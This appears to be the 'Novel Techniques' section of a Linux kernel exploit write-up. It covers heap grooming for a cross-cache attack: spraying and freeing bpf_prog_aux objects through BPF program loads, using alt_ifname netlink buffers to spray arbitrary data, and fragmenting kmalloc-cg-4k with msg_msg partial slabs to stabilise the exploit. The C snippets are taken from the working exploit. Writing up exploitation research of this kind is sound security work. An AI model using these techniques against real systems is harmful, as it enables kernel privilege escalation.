# Novel Techniques

## kmalloc-2k groom/potential target object: `bpf_prog_aux`
```c
struct bpf_prog *bpf_prog_alloc_no_stats(unsigned int size, gfp_t gfp_extra_flags)
{
	gfp_t gfp_flags = bpf_memcg_flags(GFP_KERNEL | __GFP_ZERO | gfp_extra_flags);
	struct bpf_prog_aux *aux;
[...]
	aux = kzalloc(sizeof(*aux), bpf_memcg_flags(GFP_KERNEL | gfp_extra_flags));
[...]
}
```
The `bpf_prog_aux` object gets allocated by the `bpf_prog_alloc_no_stats`.
It can be allocated from userland by creating an empty bpf program:
```c
    struct bpf_insn insns[] = {
        BPF_MOV64_IMM(BPF_REG_0, 4),
        BPF_EXIT_INSN(),
    };
[...]
    union bpf_attr prog_attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
        .insns = (uint64_t)insns,
        .license = (uint64_t) "GPL v2",
        .log_level = 0,
        .log_size = 0,
        .log_buf = (uint64_t)0};

[...]
    /* defrag 2k slab (bpf_prog_aux) */
    int progfd[SPRAY];
    puts("[*] kmalloc-2k defrag");
    for (int i = 0; i < 3 * SPRAY / 4; i++)
    {
        progfd[i] = bpf(BPF_PROG_LOAD, &prog_attr);
        if (progfd[i] == -1)
            errout("bpf(BPF_PROG_LOAD)");
    }
```

It can be later freed by simply closing the bpf program's fd:
```c
    /* free slab containing tcx_entry (return it to buddy) */
    printf("[*] cross-cache (kmalloc-2k -> kmalloc-cg-2k)\n");
    for (int i = SPRAY / 2; i < SPRAY; i++)
        close(progfd[i]);
```

This is useful for spraying and manipulating heap layout in kmalloc-2k and it's what I ended up using for holding kmalloc-2k slabs that I later return to the page allocator for my cross-cache. It's also worth noting that the first qword is a refcount to track the life time of the bpf program bound to it, which can make it an interesting target for exploitation, however I didn't end up using it for that purpose in my exploit for the reasons described in `exploit.md`, so I'm only mentioning this as a side note.

## Arbitrary data spray object: `alt_ifname`
```c
static int rtnl_alt_ifname(int cmd, struct net_device *dev, struct nlattr *attr,
			   bool *changed, struct netlink_ext_ack *extack)
{
	char *alt_ifname;
	size_t size;
	int err;

	err = nla_validate(attr, attr->nla_len, IFLA_MAX, ifla_policy, extack);
[...]
	alt_ifname = nla_strdup(attr, GFP_KERNEL_ACCOUNT);
[...]
	kfree(alt_ifname);
	if (!err)
		*changed = true;
	return err;
}
``` 
The `alt_ifname` object is a temporary buffer where user data is stored with an arbitrary size, allocated with `GFP_KERNEL_ACCOUNT`. Keep in mind that `rtnl_alt_ifname` is only called from contexts where the rtnl lock is acquired, so spawning multiple threads to race and spray the temporary buffer won't work, so we have to make sure the object we want to overwrite is first on the freelist.

## Cross-cache stabilization technique/trick
```c
    /* create cg-4k partial slabs to avoid disputing buddy pages with cg-2k */
    puts("[*] kmalloc-cg-4k partial slabs");
    for (int i = 0; i < SPRAY; i++)
        msgsnd(frag4k[i], msg, 4096 - 48, 0);
    for (int i = 8; i < SPRAY; i++)
    {
        if (!(i % 8))
            continue;
        if (msgrcv(frag4k[i], msg, 4096 - 48, MTYPE_PRIMARY, 0) < 0)
            errout("msgrcv");
    }
```
Further improve cross-cache stability by purposefully fragmenting other caches that I don't want to take the freed slab by creating several used slabs and leaving only 1 object left in each of them, creating several partial slabs with freelists that `kmalloc()` can chew on long before it starts asking for new pages. In my exploit, both `msg_msg` in kmalloc-cg-4k and `msg_msgseg` in kmalloc-cg-2k get allocated in the same path, but I want to make sure `msg_msgseg` takes the freed slab from the page allocator. To ensure that, not only I defrag kmalloc-cg-2k (common knowledge) but also frag kmalloc-cg-4k with partial slabs (novel to the best of my knowledge), which took the success rate of this specific step from less than 40% to succeeding the great majority of the time.